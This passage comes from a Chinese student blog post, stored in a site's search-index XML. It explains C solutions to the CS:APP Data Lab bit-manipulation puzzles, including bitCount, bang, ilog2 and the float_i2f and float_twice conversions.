x to the right by n, using a logical shift</span><br><span class="hljs-comment"> *   Can assume that 0 &lt;= n &lt;= 31</span><br><span class="hljs-comment"> *   Examples: logicalShift(0x87654321,4) = 0x08765432</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 20</span><br><span class="hljs-comment"> *   Rating: 3 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">logicalShift</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br><span class="hljs-keyword">int</span> result = (x &gt;&gt; n) &amp; (~(((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>) &gt;&gt; n) &lt;&lt; <span class="hljs-number">1</span>));<br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="4bitcount"><a class="markdownIt-Anchor" href="#4bitcount"></a> 4.bitCount</h2><p>此问题较为复杂，参考了网上的做法，采用自底向上的方式进行求解，先求两位中1的个数、再求四位中1的个数……最后求三十二位中1的个数</p><p>具体过程如图所示:</p><p><img src="/posts/330a79db/image-20210406160622289.png" alt></p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * bitCount - returns count of number of 1&#x27;s in word</span><br><span class="hljs-comment"> *   Examples: bitCount(5) = 2, bitCount(7) = 3</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 40</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bitCount</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br><span class="hljs-keyword">int</span> mask_1,mask_2,mask_4,mask_8,mask_16;<br><br>  mask_1=<span class="hljs-number">0x55</span>|(<span class="hljs-number">0x55</span>&lt;&lt;<span class="hljs-number">8</span>);<br>  mask_1=mask_1|(mask_1&lt;&lt;<span class="hljs-number">16</span>);<span class="hljs-comment">//计算得到0x55555555,即01010101···</span><br>  mask_2=<span class="hljs-number">0x33</span>|(<span class="hljs-number">0x33</span>&lt;&lt;<span class="hljs-number">8</span>);<br>  mask_2=mask_2|(mask_2&lt;&lt;<span class="hljs-number">16</span>);<span class="hljs-comment">//计算得到0x33333333,即00110011···</span><br>  mask_4=<span class="hljs-number">0x0f</span>|(<span class="hljs-number">0x0f</span>&lt;&lt;<span class="hljs-number">8</span>);<br>  mask_4=mask_4|(mask_4&lt;&lt;<span class="hljs-number">16</span>);<span class="hljs-comment">//计算得到0x0f0f0f0f,即00001111···</span><br>  mask_8=<span class="hljs-number">0xff</span>|(<span class="hljs-number">0xff</span>&lt;&lt;<span class="hljs-number">16</span>);<span class="hljs-comment">//0000000011111111 0000000011111111</span><br>  mask_16=<span class="hljs-number">0xff</span>|(<span class="hljs-number">0xff</span>&lt;&lt;<span class="hljs-number">8</span>);<span class="hljs-comment">//00000000000000001111111111111111</span><br>  x=(x&amp;mask_1)+((x&gt;&gt;<span class="hljs-number">1</span>)&amp;mask_1);<br>  x=(x&amp;mask_2)+((x&gt;&gt;<span class="hljs-number">2</span>)&amp;mask_2);<br>  <span class="hljs-comment">//下面三组最高位不会是1了 </span><br>  x=(x+(x&gt;&gt;<span class="hljs-number">4</span>))&amp;mask_4;<span class="hljs-comment">//x=(x&amp;mask_4)+((x&gt;&gt;4)&amp;mask_4);</span><br>  x=(x+(x&gt;&gt;<span class="hljs-number">8</span>))&amp;mask_8;<span class="hljs-comment">//x=(x&amp;mask_8)+((x&gt;&gt;8)&amp;mask_8);</span><br>  x=(x+(x&gt;&gt;<span class="hljs-number">16</span>))&amp;mask_16;<span class="hljs-comment">//x=(x&amp;mask_16)+((x&gt;&gt;16)&amp;mask_16);</span><br>  <span class="hljs-keyword">return</span> x;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="5bang"><a class="markdownIt-Anchor" href="#5bang"></a> 5.bang</h2><p>不利用逻辑符号!求一个数的逻辑非，也就是判断该数的二进制位<strong>是否全为0</strong>，若全为0则返回1，否则返回0。</p><p>一个<strong>求补码</strong>的方法：<strong>从最低位到第一个1之间不变，其他位按位取反</strong>。</p><p>一个数与其补码相或后，只有0x00000000的结果最高位是0，其他数结果都是1，所以我们将原数与其补码相或后右移31位得到最高位，将最高位与1相与，结果为0说明原数是0，取反后输出1，否则说明原数不为0，取反后输出0。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * bang - Compute !x without using !</span><br><span class="hljs-comment"> *   Examples: bang(3) = 0, bang(0) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 4 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bang</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br><br> <span class="hljs-keyword">return</span> ~((x|(~x+<span class="hljs-number">1</span>))&gt;&gt;<span class="hljs-number">31</span>)&amp;<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="6tmin"><a class="markdownIt-Anchor" href="#6tmin"></a> 6.tmin</h2><p>返回 最小的二进制补码，为0x 8000 0000，直接左移31位即可</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tmin - return minimum two&#x27;s complement integer </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 4</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">tmin</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="7fitsbits"><a class="markdownIt-Anchor" href="#7fitsbits"></a> 7.fitsBits</h2><p>判断一个数能否表示成n位的二进制，能则返回1，不能返回0</p><p>关键在于这个n位是包括符号位的，即对于一个整数，其最高位应为0，对于一个负数，最高位为1</p><p>先左移32-n 再右移32-n,考虑符号位，若与x相等则说明可以。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * fitsBits - return 1 if x can be represented as an </span><br><span class="hljs-comment"> * n-bit, two&#x27;s complement integer.</span><br><span class="hljs-comment"> * 1 &lt;= n &lt;= 32</span><br><span class="hljs-comment"> * Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1</span><br><span class="hljs-comment"> * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> * Max ops: 15</span><br><span class="hljs-comment"> * Rating: 2</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fitsBits</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>   <span class="hljs-keyword">int</span> shiftNumber= <span class="hljs-number">32</span> + (~n + <span class="hljs-number">1</span>);<span class="hljs-comment">// 32 - n</span><br>   <span class="hljs-keyword">return</span> !(x^((x&lt;&lt;shiftNumber)&gt;&gt;shiftNumber));<br>   &#125;<br></code></pre></div></td></tr></table></figure><h2 id="8divpwr2"><a class="markdownIt-Anchor" href="#8divpwr2"></a> 8.divpwr2</h2><p>将一个数除以2的n次方</p><p>除法是向下取整，正数位运算和除法运算相同，负数除法向0取整，位运算向下取整，<br>所以要靠位运算来实现负数除法就要加一个偏置量，使其变成比原来的数小2^n个单位的数<br>使得新数通过位运算的向下取整和原数的向0取整结果相同</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30</span><br><span class="hljs-comment"> *  Round toward zero</span><br><span class="hljs-comment"> *   Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 15</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">divpwr2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br><span class="hljs-keyword">int</span> signx=x&gt;&gt;<span class="hljs-number">31</span>;<br><span class="hljs-keyword">int</span> mask =(<span class="hljs-number">1</span>&lt;&lt;n)+(~<span class="hljs-number">0</span>);<br><span class="hljs-keyword">int</span> bias=signx&amp;mask;<br>    <span class="hljs-keyword">return</span> (bias+x)&gt;&gt;n;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="9negate"><a class="markdownIt-Anchor" href="#9negate"></a> 9.negate</h2><p>返回-x，很简单</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * negate - return -x </span><br><span class="hljs-comment"> *   Example: negate(1) = -1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 5</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">negate</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> ~x+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="10ispositive"><a class="markdownIt-Anchor" href="#10ispositive"></a> 10.isPositive</h2><p>正数符号位为0，负数符号位为，0的符号位也是0。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isPositive - return 1 if x &gt; 0, return 0 otherwise </span><br><span class="hljs-comment"> *   Example: isPositive(-1) = 0.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 8</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isPositive</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> !(x&gt;&gt;<span class="hljs-number">31</span>|!x);<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="11islessorequal"><a class="markdownIt-Anchor" href="#11islessorequal"></a> 11.isLessOrEqual</h2><p>这道题相当于枚举 x&lt;=y 的所有情况：<br>1.x为负数，y 为正数<br>2.x 等于 y<br>3.x 和 y 符号相同，并且 y-x 为正数</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span><br><span class="hljs-comment"> *   Example: isLessOrEqual(4,5) = 1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 24</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br><span class="hljs-keyword">int</span> signx = (x&gt;&gt;<span class="hljs-number">31</span>) &amp; <span class="hljs-number">0x1</span>;<br><span class="hljs-keyword">int</span> signy = (y&gt;&gt;<span class="hljs-number">31</span>) &amp; <span class="hljs-number">0x1</span>;<br><span class="hljs-keyword">int</span> tmp = signx ^ signy;<br><span class="hljs-keyword">int</span> tmp1 = tmp &amp; signx;<span class="hljs-comment">//为1时表示x为负数，y为正数</span><br><span class="hljs-keyword">int</span> y_x=y+(~x+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> tmp1|(!(x^y))|(!tmp&amp;!(y_x&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)));<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="12ilog2"><a class="markdownIt-Anchor" href="#12ilog2"></a> 12.ilog2</h2><p>求一个数是2的几次幂，即求最高位的1的索引（0-31）</p><p>也是二分，先去掉后16位，先判断左边16位，若全是0，则!!(x&gt;&gt;16)返回0，否则返回1,1&lt;&lt;4则记录左边16位的最低位索引</p><p>若前16位中含1，则只保留了前16位，否则前16的0可以忽略，相当于考虑后16位</p><p>之后同理，将16位二分，然后记录索引。</p><p>全部索引相加就是结果</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ilog2 - return floor(log base 2 of x), where x &gt; 0</span><br><span class="hljs-comment"> *   Example: ilog2(16) = 4</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 90</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">ilog2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br><span class="hljs-keyword">int</span> bitsNumber = <span class="hljs-number">0</span>;<br>bitsNumber = (!!(x &gt;&gt; <span class="hljs-number">16</span>)) &lt;&lt; <span class="hljs-number">4</span>;<span class="hljs-comment">//去掉后16位，判断左边16位是否全为0，不是则记录左边16位的最低位索引</span><br>bitsNumber += (!!(x &gt;&gt; (bitsNumber + <span class="hljs-number">8</span>)) &lt;&lt; <span class="hljs-number">3</span>);<span class="hljs-comment">//判断左边16位是否全为0，不是则记录左边位8的最低位索引</span><br>bitsNumber += (!!(x &gt;&gt; (bitsNumber + <span class="hljs-number">4</span>)) &lt;&lt; <span class="hljs-number">2</span>);<span class="hljs-comment">//</span><br>bitsNumber += (!!(x &gt;&gt; (bitsNumber + <span class="hljs-number">2</span>)) &lt;&lt; <span class="hljs-number">1</span>);<span class="hljs-comment">//</span><br>bitsNumber += (!!(x &gt;&gt; (bitsNumber + <span class="hljs-number">1</span>)));<span class="hljs-comment">//</span><br><span class="hljs-keyword">return</span> bitsNumber;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="13float_neg"><a class="markdownIt-Anchor" href="#13float_neg"></a> 13.float_neg</h2><p>返回一个无符号浮点数的负的单精度浮点数表达，参数NaN（阶码全为1，小数域非0）时返回原值</p><p>关键在于NaN的判断，其他参数加上一个符号位即可；</p><p>((uf&gt;&gt;23)&amp;0xff)^0xff判断阶码是否全为1，是的话结果为0，!(uf&amp;((1&lt;&lt;23)-1))判断小数域是否全为0，是的话为1</p><p>所以代码含义就是：</p><p>if(不是NaN)加符号位</p><p>否则返回原参数</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * float_neg - Return bit-level equivalent of expression -f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representations of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 10</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">float_neg</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> uf)</span> </span>&#123;<br><span class="hljs-keyword">if</span>((((uf&gt;&gt;<span class="hljs-number">23</span>)&amp;<span class="hljs-number">0xff</span>)^<span class="hljs-number">0xff</span>)||!(uf&amp;((<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">23</span>)<span class="hljs-number">-1</span>))) uf=(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)^uf;<br><br>  <span class="hljs-keyword">return</span> uf;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="14float_i2f"><a class="markdownIt-Anchor" href="#14float_i2f"></a> 14.float_i2f</h2><p>将一个int型数转化为浮点型。</p><p>问题重点在于考虑浮点数的舍入</p><ul><li><p>浮点数舍入规则</p><p>如果以形式1.RR…RDD…D表示浮点数（R表示有效位，或保留位，而D表示舍去位），舍入规则就是：</p><p>如果DD…D &lt; 10…0，则向下舍入</p><p>如果DD…D &gt; 10…0，则向上舍入</p><p>如要DD…D = 10…0，则向最近偶数舍入，细则如下 ：</p><p>a. 如果RR…R = XX…0 （最低有效位是0），则向下舍入</p><p>b. 如果RR…R = XX…1（最低有效位是1），则向上舍入</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * float_i2f - Return bit-level equivalent of expression (float) x</span><br><span class="hljs-comment"> *   Result is returned as unsigned int, but</span><br><span class="hljs-comment"> *   it is to be interpreted as the bit-level representation of a</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">float_i2f</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">unsigned</span> shiftLeft=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">unsigned</span> afterShift, tmp, flag;<br>    <span class="hljs-keyword">unsigned</span> absX=x;<br>    <span class="hljs-keyword">unsigned</span> sign=<span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//special case</span><br>    <span class="hljs-keyword">if</span> (x==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//if x &lt; 0, sign = 1000...,abs_x = -x</span><br>    <span class="hljs-keyword">if</span> (x&lt;<span class="hljs-number">0</span>)<span class="hljs-comment">//小于0，则取反</span><br>    &#123;<br>sign=<span class="hljs-number">0x80000000</span>;<br>absX=-x;<br>    &#125;<br>    afterShift=absX;<br>    <span class="hljs-comment">//count shift_left and after_shift</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<span class="hljs-comment">//计算阶码E=32-shiftLeft，aftershift保留尾数的值</span><br>    &#123;<br>tmp=afterShift;<br>afterShift&lt;&lt;=<span class="hljs-number">1</span>;<br>shiftLeft++;<br><span class="hljs-keyword">if</span> (tmp &amp; <span class="hljs-number">0x80000000</span>) <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">//afterShift的前23位保留作为尾数，要考虑舍入</span><br>    <span class="hljs-keyword">if</span> ((afterShift &amp; <span class="hljs-number">0x01ff</span>)&gt;<span class="hljs-number">0x0100</span>)<span class="hljs-comment">//进位</span><br>flag=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((afterShift &amp; <span class="hljs-number">0x03ff</span>)==<span class="hljs-number">0x0300</span>)<span class="hljs-comment">//向偶数舍入</span><br>flag=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span><br>flag=<span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">return</span> sign +((<span class="hljs-number">127</span>+<span class="hljs-number">32</span>-shiftLeft)&lt;&lt;<span class="hljs-number">23</span>) +(afterShift&gt;&gt;<span class="hljs-number">9</span>) + flag;<br>    <span class="hljs-comment">//符号位+阶码+尾数+舍入值</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="15float_twice"><a class="markdownIt-Anchor" href="#15float_twice"></a> 15.float_twice</h2><p>返回一个无符号浮点数的两倍</p><p>对于非规格化数，尾数左移1位就相当于乘2</p><p>对于规格化数，阶码加一即可</p><p>对于NaN，返回原值</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * float_twice - Return bit-level equivalent of expression 2*f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representation of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">float_twice</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> uf)</span> </span>&#123;<br><span class="hljs-keyword">if</span>((uf&amp;<span class="hljs-number">0x7f800000</span>)==<span class="hljs-number">0</span>)  <span class="hljs-comment">//阶码为0，非规格化数</span><br>uf=((uf&amp;<span class="hljs-number">0x007fffff</span>)&lt;&lt;<span class="hljs-number">1</span>)|(uf&amp;<span class="hljs-number">0x80000000</span>);<span class="hljs-comment">//尾数域左移一位，别忘了符号</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((uf&amp;<span class="hljs-number">0x7f800000</span>)!=<span class="hljs-number">0x7f800000</span>) <span class="hljs-comment">//不是NaN ，阶码不是全1 </span><br>uf=uf+<span class="hljs-number">0x800000</span>;<span class="hljs-comment">//阶码+1，2^(1+1)=2*2  </span><br>  <span class="hljs-keyword">return</span> uf;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="测试结果截图"><a class="markdownIt-Anchor" href="#测试结果截图"></a> 测试结果截图</h2><p><img src="/posts/330a79db/image-20210407110327739.png" alt="image-20210407110327739"></p>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>计算机系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机系统</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
